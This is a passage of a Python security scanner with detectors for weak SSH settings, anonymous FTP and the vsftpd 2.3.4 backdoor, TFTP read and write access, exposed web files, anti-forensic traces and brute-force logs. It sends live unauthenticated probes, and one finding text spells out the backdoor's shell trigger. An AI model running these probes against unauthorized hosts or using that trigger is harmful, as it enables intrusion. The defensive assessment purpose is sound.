        for v in weak_versions:
            if v.lower() in banner.lower():
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'WEAK_SSH_VERSION',
                    'detail': (
                        f'host={host} port={port} banner={banner!r} '
                        f'note=Outdated_SSH_version_targeted_by_botnet_credential_spray '
                        f'matched={v}'
                    ),
                    'host': host,
                    'port': port,
                })
                break
    except (socket.timeout, ConnectionRefusedError, OSError):
        pass

    # --- Local: /etc/ssh/sshd_config checks ---
    sshd_config_paths = ['/etc/ssh/sshd_config']
    for cfg_path in sshd_config_paths:
        if not os.path.isfile(cfg_path):
            continue
        try:
            with open(cfg_path, 'r', errors='replace') as fh:
                cfg_lines = fh.readlines()

            for line in cfg_lines:
                stripped = line.strip()
                if stripped.startswith('#'):
                    continue

                # PasswordAuthentication yes
                if re.match(r'^PasswordAuthentication\s+yes', stripped, re.IGNORECASE):
                    findings.append({
                        'severity': 'HIGH',
                        'title': 'SSH_PASSWORD_AUTH_ENABLED',
                        'detail': (
                            f'host={host} port={port} config={cfg_path} '
                            f'line={stripped!r} '
                            f'note=Password_auth_enabled_botnet_pivot_via_credential_spray'
                        ),
                        'host': host,
                        'port': port,
                    })

                # PermitRootLogin yes
                if re.match(r'^PermitRootLogin\s+yes', stripped, re.IGNORECASE):
                    findings.append({
                        'severity': 'CRITICAL',
                        'title': 'SSH_ROOT_LOGIN_PERMITTED',
                        'detail': (
                            f'host={host} port={port} config={cfg_path} '
                            f'line={stripped!r} '
                            f'note=Root_login_via_SSH_permitted_direct_privilege_escalation_path'
                        ),
                        'host': host,
                        'port': port,
                    })
        except OSError:
            pass

    # --- Local: authorized_keys with >1 key ---
    auth_key_paths = [
        os.path.expanduser('~/.ssh/authorized_keys'),
        '/root/.ssh/authorized_keys',
    ]
    # Also scan all home dirs
    try:
        for entry in os.scandir('/home'):
            if entry.is_dir():
                candidate = os.path.join(entry.path, '.ssh', 'authorized_keys')
                if candidate not in auth_key_paths:
                    auth_key_paths.append(candidate)
    except OSError:
        pass

    for ak_path in auth_key_paths:
        if not os.path.isfile(ak_path):
            continue
        try:
            with open(ak_path, 'r', errors='replace') as fh:
                keys = [l for l in fh.readlines()
                        if l.strip() and not l.strip().startswith('#')]
            if len(keys) > 1:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'SSH_MULTIPLE_AUTHORIZED_KEYS',
                    'detail': (
                        f'host={host} port={port} path={ak_path} '
                        f'key_count={len(keys)} '
                        f'note=Multiple_authorized_keys_indicate_lateral_access_surface'
                    ),
                    'host': host,
                    'port': port,
                })
        except OSError:
            pass

    return findings


def detect_ftp_mass_compromise(host: str, port: int = 21, timeout: float = 5.0) -> list:
    """FTP-based web compromise patterns.

    Synthesized from Violent Python Ch.2 (FTP anonymous login, mass defacement
    attack via HTML upload to webroot) and CVE-2011-2523 (vsftpd 2.3.4 backdoor).
    """
    findings = []

    # --- TCP/21 banner: vsftpd 2.3.4 backdoor ---
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        banner = sock.recv(1024).decode('utf-8', errors='replace').strip()

        if 'vsftpd 2.3.4' in banner:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'VSFTPD_BACKDOOR_VERSION',
                'detail': (
                    f'host={host} port={port} banner={banner!r} '
                    f'note=vsftpd_2.3.4_backdoor_CVE-2011-2523_trigger_:)_in_USER_opens_shell_port_6200'
                ),
                'host': host,
                'port': port,
            })

        # --- Anonymous FTP login attempt ---
        def ftp_cmd(s: socket.socket, cmd: str) -> str:
            s.sendall((cmd + '\r\n').encode())
            return s.recv(4096).decode('utf-8', errors='replace')

        resp = ftp_cmd(sock, 'USER anonymous')
        resp += ftp_cmd(sock, 'PASS x@x.com')

        if resp and '230' in resp:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'FTP_ANONYMOUS_LOGIN',
                'detail': (
                    f'host={host} port={port} '
                    f'note=Anonymous_FTP_login_accepted_mass_upload_vector '
                    f'response_excerpt={resp[:200]!r}'
                ),
                'host': host,
                'port': port,
            })

            # --- LIST to check for web files ---
            try:
                # Enter passive mode to get data channel
                pasv_resp = ftp_cmd(sock, 'PASV')
                pasv_match = re.search(
                    r'(\d+),(\d+),(\d+),(\d+),(\d+),(\d+)', pasv_resp
                )
                if pasv_match:
                    g = pasv_match.groups()
                    data_ip = '.'.join(g[:4])
                    data_port = int(g[4]) * 256 + int(g[5])

                    data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    data_sock.settimeout(timeout)
                    data_sock.connect((data_ip, data_port))

                    ftp_cmd(sock, 'LIST')
                    listing = b''
                    while True:
                        chunk = data_sock.recv(4096)
                        if not chunk:
                            break
                        listing += chunk
                    data_sock.close()
                    listing_str = listing.decode('utf-8', errors='replace')

                    html_pattern = re.compile(r'\.(html|htm|php|asp|aspx)\s*$', re.IGNORECASE | re.MULTILINE)
                    if html_pattern.search(listing_str):
                        findings.append({
                            'severity': 'CRITICAL',
                            'title': 'FTP_WEB_FILES_ACCESSIBLE',
                            'detail': (
                                f'host={host} port={port} '
                                f'note=Web_files_visible_via_anonymous_FTP_mass_defacement_vector '
                                f'listing_excerpt={listing_str[:300]!r}'
                            ),
                            'host': host,
                            'port': port,
                        })

                    # Check for webroot paths in listing
                    webroot_indicators = ('/var/www', '/htdocs', '/www', '/public_html', 'wwwroot')
                    for indicator in webroot_indicators:
                        if indicator in listing_str.lower():
                            findings.append({
                                'severity': 'HIGH',
                                'title': 'FTP_WEBROOT_WRITABLE',
                                'detail': (
                                    f'host={host} port={port} '
                                    f'note=FTP_listing_contains_webroot_path_{indicator}_upload_defacement_risk '
                                    f'listing_excerpt={listing_str[:200]!r}'
                                ),
                                'host': host,
                                'port': port,
                            })
                            break
            except (socket.timeout, OSError):
                pass

        sock.close()
    except (socket.timeout, ConnectionRefusedError, OSError):
        pass

    return findings


def detect_network_traffic_anomalies(interface: str = 'eth0', timeout: float = 5.0) -> list:
    """Network traffic anomaly indicators via local /proc/net and /sys reads.

    Synthesized from Violent Python Ch.5 (network traffic analysis, port scan
    detection, packet pattern recognition) and Black Hat Python Ch.4 (raw socket
    traffic inspection). Read-only — no packet capture required.

    /proc/net/tcp connection state codes:
      01=ESTABLISHED 02=SYN_SENT 03=SYN_RECV 04=FIN_WAIT1 05=FIN_WAIT2
      06=TIME_WAIT 07=CLOSE 08=CLOSE_WAIT 09=LAST_ACK 0A=LISTEN 0B=CLOSING
    """
    findings = []

    # --- /proc/net/tcp: SYN_SENT connections (state=02) ---
    def _parse_proc_net_tcp(path: str) -> list:
        rows = []
        if not os.path.isfile(path):
            return rows
        try:
            with open(path, 'r', errors='replace') as fh:
                lines = fh.readlines()[1:]  # skip header
            for line in lines:
                parts = line.split()
                if len(parts) < 4:
                    continue
                try:
                    local_addr, rem_addr, state = parts[1], parts[2], parts[3]
                    rows.append((local_addr, rem_addr, state))
                except (IndexError, ValueError):
                    continue
        except OSError:
            pass
        return rows

    def _hex_to_ip_port(hex_str: str):
        addr, port_hex = hex_str.split(':')
        # Little-endian 32-bit IP
        ip_int = int(addr, 16)
        ip = socket.inet_ntoa(struct.pack('<I', ip_int))
        port = int(port_hex, 16)
        return ip, port

    tcp4_rows = _parse_proc_net_tcp('/proc/net/tcp')
    tcp6_rows = _parse_proc_net_tcp('/proc/net/tcp6')

    # SYN_SENT count from tcp4
    syn_sent = [r for r in tcp4_rows if r[2] == '02']
    if len(syn_sent) > 50:
        findings.append({
            'severity': 'HIGH',
            'title': 'MASS_SYN_CONNECTIONS',
            'detail': (
                f'host=localhost interface={interface} '
                f'syn_sent_count={len(syn_sent)} threshold=50 '
                f'note=High_SYN_SENT_connection_count_indicates_active_port_scan_or_botnet_propagation'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # Port clustering in tcp6: >10 unique remote IPs on same non-standard port
    from collections import defaultdict as _defaultdict
    port_to_hosts = _defaultdict(set)
    for _, rem_addr, state in tcp6_rows:
        try:
            # tcp6 remote is 128-bit; skip malformed
            parts = rem_addr.split(':')
            if len(parts) != 2:
                continue
            port = int(parts[1], 16)
            host_hex = parts[0]
            if port not in (80, 443, 22, 25, 53, 21, 110, 143, 993, 995, 3306, 5432) and port > 1024:
                port_to_hosts[port].add(host_hex)
        except (ValueError, IndexError):
            continue

    for p, hosts in port_to_hosts.items():
        if len(hosts) > 10:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'PORT_SCAN_PATTERN_DETECTED',
                'detail': (
                    f'host=localhost interface={interface} '
                    f'destination_port={p} unique_remote_hosts={len(hosts)} threshold=10 '
                    f'note=TCP6_connections_to_non_standard_port_from_many_hosts_port_scan_pattern'
                ),
                'host': 'localhost',
                'port': p,
            })

    # --- /proc/net/udp: >20 connections to same destination port ---
    def _parse_proc_net_udp(path: str) -> list:
        rows = []
        if not os.path.isfile(path):
            return rows
        try:
            with open(path, 'r', errors='replace') as fh:
                lines = fh.readlines()[1:]
            for line in lines:
                parts = line.split()
                if len(parts) < 3:
                    continue
                try:
                    rows.append(parts[2])  # remote_address field
                except IndexError:
                    continue
        except OSError:
            pass
        return rows

    udp_remotes = _parse_proc_net_udp('/proc/net/udp')
    udp_port_counts = _defaultdict(int)
    for rem in udp_remotes:
        try:
            port = int(rem.split(':')[1], 16)
            if port > 0:
                udp_port_counts[port] += 1
        except (IndexError, ValueError):
            continue

    for p, count in udp_port_counts.items():
        if count > 20:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'UDP_FLOOD_INDICATORS',
                'detail': (
                    f'host=localhost interface={interface} '
                    f'destination_port={p} connection_count={count} threshold=20 '
                    f'note=High_UDP_connection_count_to_single_port_UDP_flood_or_amplification_indicator'
                ),
                'host': 'localhost',
                'port': p,
            })

    # --- /sys/class/net/{interface}/statistics: tx/rx ratio > 10 ---
    stats_base = f'/sys/class/net/{interface}/statistics'
    rx_path = os.path.join(stats_base, 'rx_bytes')
    tx_path = os.path.join(stats_base, 'tx_bytes')
    try:
        if os.path.isfile(rx_path) and os.path.isfile(tx_path):
            with open(rx_path) as fh:
                rx = int(fh.read().strip())
            with open(tx_path) as fh:
                tx = int(fh.read().strip())
            if rx > 0 and tx / rx > 10:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'ASYMMETRIC_TRAFFIC',
                    'detail': (
                        f'host=localhost interface={interface} '
                        f'tx_bytes={tx} rx_bytes={rx} tx_rx_ratio={tx/rx:.1f} threshold=10 '
                        f'note=Transmit_exceeds_receive_by_10x_data_exfiltration_indicator'
                    ),
                    'host': 'localhost',
                    'port': 0,
                })
    except (OSError, ValueError, ZeroDivisionError):
        pass

    return findings


def detect_web_recon_indicators(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """Web reconnaissance footprint detection.

    Synthesized from Violent Python Ch.6 (web recon by application footprint,
    TOR-anonymized scanning patterns) and Black Hat Python Ch.7 (web app
    enumeration, directory discovery). Probes paths that reveal structure,
    version, and developer artifacts useful to attackers.
    """
    findings = []

    use_tls = port in (443, 8443)

    def _get(path: str):
        return _http_get(host, port, path, tls=use_tls, to=timeout)

    # --- /robots.txt ---
    code, body = _get('/robots.txt')
    if code == 200 and body:
        admin_patterns = re.compile(
            r'Disallow:\s*/(admin|backup|config|private|internal|secret|staging|wp-admin|phpmyadmin)',
            re.IGNORECASE
        )
        if admin_patterns.search(body):
            findings.append({
                'severity': 'MEDIUM',
                'title': 'ROBOTS_TXT_EXPOSES_PATHS',
                'detail': (
                    f'host={host} port={port} path=/robots.txt status={code} '
                    f'note=robots.txt_Disallow_entries_reveal_admin_or_backup_paths '
                    f'body_excerpt={body[:300]!r}'
                ),
                'host': host,
                'port': port,
            })

    # --- /sitemap.xml ---
    code, body = _get('/sitemap.xml')
    if code == 200 and body:
        if '<url>' in body.lower() or '<loc>' in body.lower() or '<?xml' in body.lower():
            findings.append({
                'severity': 'MEDIUM',
                'title': 'SITEMAP_PUBLICLY_ACCESSIBLE',
                'detail': (
                    f'host={host} port={port} path=/sitemap.xml status={code} '
                    f'note=Sitemap_exposes_full_URL_structure_path_enumeration_for_targeted_recon '
                    f'body_excerpt={body[:200]!r}'
                ),
                'host': host,
                'port': port,
            })

    # --- /.git/HEAD ---
    code, body = _get('/.git/HEAD')
    if code == 200 and body:
        if 'ref:' in body or 'HEAD' in body:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'GIT_REPO_EXPOSED',
                'detail': (
                    f'host={host} port={port} path=/.git/HEAD status={code} '
                    f'note=Git_repository_HEAD_accessible_source_code_exfil_via_git_clone_reconstruct '
                    f'body_excerpt={body[:120]!r}'
                ),
                'host': host,
                'port': port,
            })

    # --- Version/changelog files ---
    version_paths = [
        ('/CHANGELOG', 'CHANGELOG'),
        ('/CHANGELOG.md', 'CHANGELOG.md'),
        ('/CHANGELOG.txt', 'CHANGELOG.txt'),
        ('/VERSION', 'VERSION'),
        ('/version.txt', 'version.txt'),
        ('/readme.txt', 'readme.txt'),
        ('/README.txt', 'README.txt'),
        ('/RELEASE', 'RELEASE'),
    ]
    for vpath, vname in version_paths:
        code, body = _get(vpath)
        if code == 200 and body and len(body.strip()) > 0:
            findings.append({
                'severity': 'LOW',
                'title': 'VERSION_FILE_ACCESSIBLE',
                'detail': (
                    f'host={host} port={port} path={vpath} status={code} '
                    f'note={vname}_publicly_accessible_version_string_aids_CVE_fingerprinting '
                    f'body_excerpt={body[:120]!r}'
                ),
                'host': host,
                'port': port,
            })
            break  # one hit is sufficient

    # --- /crossdomain.xml ---
    code, body = _get('/crossdomain.xml')
    if code == 200 and body:
        wildcard_pattern = re.compile(
            r'allow-access-from[^>]*domain\s*=\s*["\']?\*["\']?',
            re.IGNORECASE
        )
        if wildcard_pattern.search(body):
            findings.append({
                'severity': 'HIGH',
                'title': 'FLASH_CROSSDOMAIN_WILDCARD',
                'detail': (
                    f'host={host} port={port} path=/crossdomain.xml status={code} '
                    f'note=crossdomain.xml_allows_all_origins_wildcard_CSRF_and_data_exfil_via_legacy_Flash_SWF '
                    f'body_excerpt={body[:300]!r}'
                ),
                'host': host,
                'port': port,
            })

    return findings


def detect_tftp_exposure(host, port=69, timeout=3.0):
    """
    Probe UDP/69 TFTP for unauthenticated read (RRQ) and write (WRQ) access.

    Synthesized from: Violent Python Ch.5 — anonymous FTP / TFTP packet
    crafting and network traffic analysis patterns (packet capture with scapy,
    anonymous FTP enumeration, finding TFTP packets in captures).

    TFTP packet wire format (RFC 1350):
        struct.pack(">H", opcode) + filename + b"\\x00" + b"octet" + b"\\x00"

    Probes:
      - RRQ opcode=1 for "boot.cfg":
          opcode=3 DATA with payload  -> CRITICAL TFTP_FILE_READABLE
          opcode=3 DATA empty / opcode=5 ERROR -> HIGH TFTP_SERVER_RESPONSIVE
      - WRQ opcode=2 for "exploit.txt":
          opcode=4 ACK block-0       -> CRITICAL TFTP_WRITE_ACCEPTED

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    def _tftp_pkt(opcode, filename):
        return struct.pack(">H", opcode) + filename.encode() + b"\x00" + b"octet" + b"\x00"

    # --- RRQ probe ---
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(_tftp_pkt(1, "boot.cfg"), (host, port))
        try:
            data, _ = s.recvfrom(65535)
            if len(data) >= 2:
                opcode = struct.unpack(">H", data[:2])[0]
                if opcode == 3:
                    payload_len = len(data) - 4  # subtract opcode(2) + block_num(2)
                    if payload_len > 0:
                        findings.append({
                            'severity': 'CRITICAL',
                            'title': 'TFTP_FILE_READABLE',
                            'detail': (
                                f'host={host} port={port} proto=UDP file=boot.cfg '
                                f'opcode=3_DATA payload_bytes={payload_len} '
                                f'note=TFTP_FILE_READABLE_config_exfiltration '
                                f'excerpt={data[4:4+64]!r}'
                            ),
                            'host': host,
                            'port': port,
                        })
                    else:
                        findings.append({
                            'severity': 'HIGH',
                            'title': 'TFTP_SERVER_RESPONSIVE',
                            'detail': (
                                f'host={host} port={port} proto=UDP file=boot.cfg '
                                f'opcode=3_DATA payload_bytes=0 '
                                f'note=TFTP_server_answered_RRQ_with_empty_DATA'
                            ),
                            'host': host,
                            'port': port,
                        })
                elif opcode == 5:
                    findings.append({
                        'severity': 'HIGH',
                        'title': 'TFTP_SERVER_RESPONSIVE',
                        'detail': (
                            f'host={host} port={port} proto=UDP file=boot.cfg '
                            f'opcode=5_ERROR '
                            f'note=TFTP_server_answered_RRQ_with_error_server_present '
                            f'error_data={data[2:66]!r}'
                        ),
                        'host': host,
                        'port': port,
                    })
        except socket.timeout:
            pass
    except Exception:
        pass
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass

    # --- WRQ probe ---
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(_tftp_pkt(2, "exploit.txt"), (host, port))
        try:
            data, _ = s.recvfrom(65535)
            if len(data) >= 2:
                opcode = struct.unpack(">H", data[:2])[0]
                if opcode == 4:
                    # ACK block 0 — server accepted WRQ
                    findings.append({
                        'severity': 'CRITICAL',
                        'title': 'TFTP_WRITE_ACCEPTED',
                        'detail': (
                            f'host={host} port={port} proto=UDP file=exploit.txt '
                            f'opcode=4_ACK '
                            f'note=TFTP_WRITE_ACCEPTED_arbitrary_upload_vector '
                            f'raw={data[:8]!r}'
                        ),
                        'host': host,
                        'port': port,
                    })
        except socket.timeout:
            pass
    except Exception:
        pass
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass

    return findings


def detect_filesystem_forensic_indicators(scan_path="/tmp"):
    """
    Enumerate anti-forensic and persistence indicators on the local filesystem.

    Synthesized from: Violent Python Ch.7 — forensic investigation tools:
    recovering deleted files, metadata analysis (Exif/PDF), timeline
    reconstruction; Violent Python Ch.3 — registry/artifact analysis patterns.

    Checks:
      - ~/.bash_history wiped (size=0 or symlink to /dev/null)
        -> HIGH BASH_HISTORY_DESTROYED
      - /var/log/auth.log or /var/log/secure zero-byte or last-modified >7 days
        -> HIGH AUTH_LOG_CLEARED
      - Files in scan_path with mtime == atime to the second
        -> MEDIUM TIMESTOMPED_FILES (forensic artifact manipulation)
      - SUID binaries in /tmp, /dev/shm, /var/tmp (not in standard dirs)
        -> CRITICAL SUID_IN_NONSTANDARD_PATH

    Returns list of {severity, title, detail, host, port}.
    """
    import time as _time
    findings = []
    host = socket.gethostname()
    port = 0

    # --- .bash_history wiped ---
    bash_history = os.path.expanduser("~/.bash_history")
    try:
        if os.path.islink(bash_history):
            link_target = os.readlink(bash_history)
            if link_target == "/dev/null":
                findings.append({
                    'severity': 'HIGH',
                    'title': 'BASH_HISTORY_DESTROYED',
                    'detail': (
                        f'host={host} path={bash_history} '
                        f'symlink_target=/dev/null '
                        f'note=BASH_HISTORY_DESTROYED_history_suppressed_via_null_symlink '
                        f'indicator=anti-forensic_history_suppression'
                    ),
                    'host': host,
                    'port': port,
                })
        elif os.path.isfile(bash_history):
            if os.path.getsize(bash_history) == 0:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'BASH_HISTORY_DESTROYED',
                    'detail': (
                        f'host={host} path={bash_history} size=0 '
                        f'note=BASH_HISTORY_DESTROYED_zero_byte_history_file '
                        f'indicator=anti-forensic_history_suppression'
                    ),
                    'host': host,
                    'port': port,
                })
    except Exception:
        pass

    # --- Auth log cleared (zero-byte or not modified in >7 days) ---
    seven_days = 7 * 24 * 3600
    now = _time.time()
    for log_path in ('/var/log/auth.log', '/var/log/secure'):
        try:
            if os.path.isfile(log_path):
                st = os.stat(log_path)
                if st.st_size == 0:
                    findings.append({
                        'severity': 'HIGH',
                        'title': 'AUTH_LOG_CLEARED',
                        'detail': (
                            f'host={host} path={log_path} size=0 '
                            f'note=AUTH_LOG_CLEARED_zero_byte_auth_log '
                            f'indicator=anti-forensic_log_tampering'
                        ),
                        'host': host,
                        'port': port,
                    })
                elif (now - st.st_mtime) > seven_days:
                    age_days = (now - st.st_mtime) / 86400.0
                    findings.append({
                        'severity': 'HIGH',
                        'title': 'AUTH_LOG_CLEARED',
                        'detail': (
                            f'host={host} path={log_path} '
                            f'last_modified_days_ago={age_days:.1f} '
                            f'note=AUTH_LOG_CLEARED_not_updated_>7d_possible_rotation_or_wipe '
                            f'indicator=anti-forensic_log_tampering'
                        ),
                        'host': host,
                        'port': port,
                    })
        except Exception:
            pass

    # --- Timestomped files: mtime == atime to the second ---
    stomped = []
    try:
        for dirpath, _dirs, filenames in os.walk(scan_path):
            for fname in filenames:
                fpath = os.path.join(dirpath, fname)
                try:
                    st = os.stat(fpath)
                    mtime_s = int(st.st_mtime)
                    atime_s = int(st.st_atime)
                    if mtime_s == atime_s and mtime_s != 0:
                        stomped.append(fpath)
                except Exception:
                    pass
            if len(stomped) >= 20:
                break
    except Exception:
        pass

    if stomped:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'TIMESTOMPED_FILES',
            'detail': (
                f'host={host} scan_path={scan_path} '
                f'count={len(stomped)} '
                f'note=TIMESTOMPED_FILES_forensic_artifact_manipulation_mtime_eq_atime '
                f'sample={stomped[:5]!r}'
            ),
            'host': host,
            'port': port,
        })

    # --- SUID binaries in non-standard writable/temp paths ---
    _standard_suid = {'/usr/bin', '/bin', '/usr/sbin', '/sbin', '/usr/local/bin'}
    suid_hits = []
    for search_root in ('/tmp', '/dev/shm', '/var/tmp'):
        if not os.path.isdir(search_root):
            continue
        try:
            for dirpath, _dirs, filenames in os.walk(search_root):
                if any(dirpath.startswith(sd) for sd in _standard_suid):
                    continue
                for fname in filenames:
                    fpath = os.path.join(dirpath, fname)
                    try:
                        st = os.stat(fpath)
                        if st.st_mode & stat.S_ISUID:
                            suid_hits.append(fpath)
                    except Exception:
                        pass
        except Exception:
            pass

    for fpath in suid_hits:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'SUID_IN_NONSTANDARD_PATH',
            'detail': (
                f'host={host} path={fpath} '
                f'note=SUID_IN_NONSTANDARD_PATH_privilege_escalation_or_persistence_implant '
                f'indicator=setuid_binary_planted_in_world_writable_dir'
            ),
            'host': host,
            'port': port,
        })

    return findings


def detect_ssh_key_reuse(scan_path="/home") -> list:
    """
    Violent Python ch2 — SSH botnet forensics: key reuse across compromised hosts.
    Walk authorized_keys and known_hosts to surface shared botnet foothold keys.
    Authorized assessment context.
    """
    findings = []

    # --- Collect authorized_keys paths ---
    ak_paths = []
    try:
        for user_dir in os.scandir(scan_path):
            if not user_dir.is_dir():
                continue
            for ssh_subdir in ('.ssh', 'ssh'):
                ak = os.path.join(user_dir.path, ssh_subdir, 'authorized_keys')
                if os.path.isfile(ak):
                    ak_paths.append((user_dir.name, ak))
    except Exception:
        pass
    for root_ak in ('/root/.ssh/authorized_keys',):
        if os.path.isfile(root_ak):
            ak_paths.append(('root', root_ak))

    # --- Global authorized_keys ---
    global_ak = '/etc/ssh/authorized_keys'
    if os.path.isfile(global_ak):
        findings.append({
            'severity': 'HIGH',
            'title': 'GLOBAL_AUTHORIZED_KEYS',
            'detail': (
                f'path={global_ak} '
                f'note=GLOBAL_AUTHORIZED_KEYS_lateral_movement_surface '
                f'indicator=system_wide_authorized_keys_allows_mass_ssh_access'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # --- Per-file: world-readable check + key collection ---
    key_to_users: dict = {}
    for username, ak_path in ak_paths:
        try:
            st = os.stat(ak_path)
            if st.st_mode & 0o004:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'AUTHORIZED_KEYS_WORLD_READABLE',
                    'detail': (
                        f'user={username} path={ak_path} '
                        f'mode={oct(st.st_mode)} '
                        f'note=AUTHORIZED_KEYS_WORLD_READABLE_allows_key_enumeration '
                        f'indicator=insecure_permissions_on_authorized_keys'
                    ),
                    'host': 'localhost',
                    'port': 0,
                })
        except Exception:
            pass
        try:
            with open(ak_path, 'r', errors='replace') as fh:
                for line in fh:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    parts = line.split()
                    if len(parts) >= 2:
                        blob = parts[1]
                        key_to_users.setdefault(blob, [])
                        if username not in key_to_users[blob]:
                            key_to_users[blob].append(username)
        except Exception:
            pass

    # --- Same public key in >3 users' authorized_keys = botnet foothold ---
    for blob, users in key_to_users.items():
        if len(users) > 3:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'SSH_KEY_SHARED_ACROSS_USERS',
                'detail': (
                    f'key_blob={blob[:32]}... '
                    f'users={",".join(users)} '
                    f'count={len(users)} '
                    f'note=SSH_KEY_SHARED_ACROSS_USERS_botnet_foothold '
                    f'indicator=same_public_key_in_{len(users)}_authorized_keys'
                ),
                'host': 'localhost',
                'port': 0,
            })

    # --- known_hosts: same fingerprint in >5 users' files = pivot target ---
    fingerprint_to_users: dict = {}
    kh_paths = []
    try:
        for user_dir in os.scandir(scan_path):
            if not user_dir.is_dir():
                continue
            for ssh_subdir in ('.ssh', 'ssh'):
                kh = os.path.join(user_dir.path, ssh_subdir, 'known_hosts')
                if os.path.isfile(kh):
                    kh_paths.append((user_dir.name, kh))
    except Exception:
        pass
    root_kh = '/root/.ssh/known_hosts'
    if os.path.isfile(root_kh):
        kh_paths.append(('root', root_kh))

    for username, kh_path in kh_paths:
        try:
            with open(kh_path, 'r', errors='replace') as fh:
                for line in fh:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    parts = line.split()
                    if len(parts) >= 3:
                        fingerprint = parts[2]
                        fingerprint_to_users.setdefault(fingerprint, [])
                        if username not in fingerprint_to_users[fingerprint]:
                            fingerprint_to_users[fingerprint].append(username)
        except Exception:
            pass

    for fingerprint, users in fingerprint_to_users.items():
        if len(users) > 5:
            findings.append({
                'severity': 'HIGH',
                'title': 'SHARED_KNOWN_HOST',
                'detail': (
                    f'fingerprint={fingerprint[:32]}... '
                    f'users={",".join(users)} '
                    f'count={len(users)} '
                    f'note=SHARED_KNOWN_HOST_pivot_target_identified '
                    f'indicator=same_host_in_{len(users)}_known_hosts_files'
                ),
                'host': 'localhost',
                'port': 0,
            })

    return findings


def detect_bruteforce_indicators(log_path="/var/log") -> list:
    """
    Violent Python ch2 — SSH brute-force worm forensics: detect active/successful attacks.
    Parse auth logs for distributed brute-force patterns matching botnet coordinated attacks.
    Authorized assessment context.
    """
    findings = []

    # --- Locate auth log ---
    auth_log = None
    for candidate in (
        os.path.join(log_path, 'auth.log'),
        os.path.join(log_path, 'secure'),
    ):
        if os.path.isfile(candidate):
            auth_log = candidate
            break

    if auth_log is None:
        return findings

    # --- Read last 1000 lines ---
    try:
        with open(auth_log, 'r', errors='replace') as fh:
            lines = fh.readlines()
        lines = lines[-1000:]
    except Exception:
        return findings

    failed_re = re.compile(
        r'Failed password for (?:invalid user )?(\S+) from ([\d.]+) port'
    )
    accepted_re = re.compile(
        r'Accepted password for (?:invalid user )?(\S+) from ([\d.]+) port'
    )

    # --- Count failures per source IP ---
    fail_counts: dict = {}
    for line in lines:
        m = failed_re.search(line)
        if m:
            src_ip = m.group(2)
            fail_counts[src_ip] = fail_counts.get(src_ip, 0) + 1

    total_failures = sum(fail_counts.values())

    # --- Accepted password after prior failures from same IP = brute force succeeded ---
    for line in lines:
        m = accepted_re.search(line)
        if m:
            src_ip = m.group(2)
            if src_ip in fail_counts and fail_counts[src_ip] > 0:
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'BRUTE_FORCE_SUCCEEDED',
                    'detail': (
                        f'source_ip={src_ip} '
                        f'prior_failures={fail_counts[src_ip]} '
                        f'log={auth_log} '
                        f'note=BRUTE_FORCE_SUCCEEDED_accepted_password_after_failures '
                        f'indicator=brute_force_authentication_succeeded'
                    ),
                    'host': 'localhost',
                    'port': 0,
                })

    # --- Single IP > 20 failures ---
    for src_ip, count in fail_counts.items():
        if count > 20:
            findings.append({
                'severity': 'HIGH',
                'title': 'BRUTE_FORCE_IN_PROGRESS',
                'detail': (
                    f'source_ip={src_ip} '
                    f'failure_count={count} '
                    f'log={auth_log} '
                    f'note=BRUTE_FORCE_IN_PROGRESS_active_attack_in_logs '
                    f'indicator=single_ip_{count}_failed_password_attempts'
                ),
                'host': 'localhost',
                'port': 0,
            })

    # --- Distributed: >5 distinct IPs each with >5 failures = botnet coordinated ---
    distributed_ips = [ip for ip, cnt in fail_counts.items() if cnt > 5]
    if len(distributed_ips) > 5:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'DISTRIBUTED_BRUTE_FORCE',
            'detail': (
                f'attacking_ip_count={len(distributed_ips)} '
                f'sample_ips={",".join(distributed_ips[:5])} '
                f'total_failures={total_failures} '
                f'log={auth_log} '
                f'note=DISTRIBUTED_BRUTE_FORCE_botnet_coordinated_attack '
                f'indicator={len(distributed_ips)}_distinct_ips_each_with_>5_failures'
            ),
            'host': 'localhost',
            'port': 0,
        })

    # --- No fail2ban + >10 auth failures = unprotected ---
    fail2ban_present = os.path.isdir('/etc/fail2ban')
    if not fail2ban_present and total_failures > 10:
        findings.append({
            'severity': 'HIGH',
            'title': 'NO_BRUTE_FORCE_PROTECTION',
            'detail': (
                f'total_auth_failures={total_failures} '
                f'fail2ban=/etc/fail2ban_absent '
                f'log={auth_log} '
                f'note=NO_BRUTE_FORCE_PROTECTION_unmitigated_brute_force_exposure '
                f'indicator=fail2ban_not_installed_and_{total_failures}_auth_failures_in_log'
            ),
            'host': 'localhost',
            'port': 0,
        })

    return findings


def detect_c2_http_patterns(binary_data: bytes) -> list:
    """
    Detect HTTP-based C2 communication patterns in binary data.

    Indicators drawn from PMA Ch. 14 (network signatures), Ch. 15 (combining
    static/dynamic analysis), and lab solutions for Labs 14-1 through 14-3:
    - Custom alphanumeric-only User-Agent strings (botnet beacon identifier)
    - POST requests to known C2 gate paths (/gate.php, /check.php, /update/, /config/)
